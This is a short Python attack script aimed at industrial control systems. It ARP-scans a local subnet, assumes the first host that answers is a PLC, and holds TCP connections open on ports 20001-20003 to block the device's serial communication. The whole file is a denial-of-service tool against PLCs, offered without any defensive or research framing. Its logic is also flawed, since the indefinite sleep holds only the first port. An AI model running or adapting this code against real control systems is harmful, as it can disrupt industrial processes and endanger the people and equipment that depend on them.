import socket
import scapy.all as scapy
import time

# Function to find the PLC's IP address on the local network
def find_plc_ip():
    print("[+] Scanning for PLC IP Address on the local network...")
    arp_request = scapy.ARP(pdst="10.0.0.0/24")  # Modify subnet if necessary
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        ip = element[1].psrc
        print(f"[+] Possible PLC found: {ip}")
        return ip  # Return first found IP (assuming it's the PLC)

    print("[-] No PLC detected.")
    return None


# Function to block serial COM by holding open a TCP session
def block_serial_com(plc_ip, ports=[20001, 20002, 20003]):
    for port in ports:
        try:
            print(f"[+] Blocking Serial COM on {plc_ip}:{port}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((plc_ip, port))  # Establish connection
            print(f"[!] Holding open connection on {plc_ip}:{port} to block usage.")
            time.sleep(99999)  # Hold the connection indefinitely
        except Exception as e:
            print(f"[-] Failed to block port {port}: {e}")


# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        block_serial_com(plc_ip)
    else:
        print("[-] Could not determine PLC IP. Exiting.")